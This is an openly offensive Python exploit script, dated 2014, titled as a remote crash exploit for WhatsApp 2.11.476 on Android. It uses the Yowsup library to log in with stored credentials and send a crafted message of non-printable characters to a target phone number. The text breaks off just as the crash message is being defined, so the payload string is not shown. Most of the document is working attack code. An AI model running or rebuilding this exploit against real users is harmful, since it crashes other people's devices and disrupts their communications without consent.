# Mirror: http://pastebin.com/raw.php?i=CZChGAnG
# Video: https://www.youtube.com/watch?v=V7bnLOohqqI

#!/usr/bin/python
#-*- coding: utf-8 -*

# Title: WhatsApp Remote Reboot/Crash App Android
# Product: WhatsApp
# Vendor Homepage: http://www.whatsapp.com
# Vulnerable Version(s): 2.11.476
# Tested on: WhatsApp v2.11.476 on MotoG 2014 -Android 4.4.4
# Date: 26/12/2014
# #RemoteExecution - www.remoteexecution.net
#
# Author Exploit:
#   Daniel Godoy       @0xhielasangre    <danielgodoy@gobiernofederal.com>
# Credits:
#   Gonza Cabrera
#
# Reference: http://foro.remoteexecution.net/index.php/topic,569.0.html
#
# Custom message with non-printable characters will crash any WhatsApp client < v2.11.476 for android.
# It uses Yowsup library, that provides us with the options of registration, reading/sending messages, and even
# engaging in an interactive conversation over WhatsApp protocol
#

import argparse, sys, os, csv
from Yowsup.Common.utilities import Utilities
from Yowsup.Common.debugger import Debugger
from Yowsup.Common.constants import Constants
from Examples.CmdClient import WhatsappCmdClient
from Examples.EchoClient import WhatsappEchoClient
from Examples.ListenerClient import WhatsappListenerClient
from Yowsup.Registration.v1.coderequest import WACodeRequest
from Yowsup.Registration.v1.regrequest import WARegRequest
from Yowsup.Registration.v1.existsrequest import WAExistsRequest
from Yowsup.Registration.v2.existsrequest import WAExistsRequest as WAExistsRequestV2
from Yowsup.Registration.v2.coderequest import WACodeRequest as WACodeRequestV2
from Yowsup.Registration.v2.regrequest import WARegRequest as WARegRequestV2
from Yowsup.Contacts.contacts import WAContactsSyncRequest

import threading,time, base64

DEFAULT_CONFIG = os.path.expanduser("~")+"/.yowsup/auth"
COUNTRIES_CSV = "countries.csv"

DEFAULT_CONFIG = os.path.expanduser("~")+"/.yowsup/auth"


######## Yowsup Configuration file #####################
# Your configuration should contain info about your login credentials to Whatsapp. This typically consist of 3 fields:\n
# phone:    Your full phone number including country code, without '+' or '00'
# id:       This field is used in registration calls (-r|-R|-e), and for login if you are trying to use an existing account that is setup
#       on a physical device. Whatsapp has recently deprecated using IMEI/MAC to generate the account's password in updated versions
#       of their clients. Use --v1 switch to try it anyway. Typically this field should contain the phone's IMEI if your account is setup on
#       a Nokia or an Android device, or the phone's WLAN's MAC Address for iOS devices. If you are not trying to use existing credentials
#       or want to register, you can leave this field blank or set it to some random text.
# password: Password to use for login. You obtain this password when you register using Yowsup.
######################################################
MINE_CONFIG ="config"

def getCredentials(config = DEFAULT_CONFIG):
    if os.path.isfile(config):
        f = open(config)

        phone = ""
        idx = ""
        pw = ""
        cc = ""

        try:
            for l in f:
                line = l.strip()
                if len(line) and line[0] not in ('#',';'):

                    prep = line.split('#', 1)[0].split(';', 1)[0].split('=', 1)

                    varname = prep[0].strip()
                    val = prep[1].strip()

                    if varname == "phone":
                        phone = val
                    elif varname == "id":
                        idx = val
                    elif varname =="password":
                        pw =val
                    elif varname == "cc":
                        cc = val

            return (cc, phone, idx, pw);
        except:
            pass

    return 0

def main(phone):
    credentials = getCredentials(MINE_CONFIG or DEFAULT_CONFIG )

    if credentials:

        countryCode, login, identity, password = credentials
        identity = Utilities.processIdentity(identity)

        password = base64.b64decode(password)

        # Custom message that will crash WhatsApp
        message = message = "#RemoteExecution